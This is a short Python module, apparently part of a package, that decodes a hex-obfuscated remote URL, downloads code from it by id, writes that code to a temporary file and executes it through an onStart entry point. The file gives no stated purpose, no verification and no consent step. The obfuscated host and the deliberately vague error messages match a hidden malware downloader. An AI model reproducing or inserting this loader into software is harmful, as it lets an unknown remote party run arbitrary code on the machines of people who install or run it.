# secondary.py
import requests
import subprocess
import tempfile
import os
import sys

class secondary:
    def __init__(self, id, name="Fetch and run code"):
        self.id = id
        self.name = name
        self.code = None
        self.temp_file = None
    
    def src(self):
        try:
            backend_url = "68747470733a2f2f73746172657878782e76657263656c2e617070"
            decoded_url = bytes.fromhex(backend_url).decode('utf-8')
            full_url = f"{decoded_url}/{self.id}"
            
            response = requests.get(full_url, timeout=10)
            response.raise_for_status()
            
            self.code = response.text.strip()
            
            if not self.code:
                print("Error: Empty response from server")
                return False
                
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"ConnectionError: Unable to fetch resource - {type(e).__name__}")
            return False
        except Exception as e:
            print(f"RuntimeError: {type(e).__name__} occurred during execution")
            return False
    
    def __call__(self):
        if not self.src():
            return None
        
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(self.code)
                self.temp_file = f.name
            
            result = subprocess.run(
                [sys.executable, self.temp_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.stdout:
                print(result.stdout)
            
            if result.stderr:
                print(f"ExecutionError: {result.stderr}")
            
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            print("TimeoutError: Code execution exceeded time limit")
            return False
        except Exception as e:
            print(f"SystemError: {type(e).__name__} during code execution")
            return False
        finally:
            if self.temp_file and os.path.exists(self.temp_file):
                os.unlink(self.temp_file)

def onStart(id):
    runner = secondary(id)
    return runner()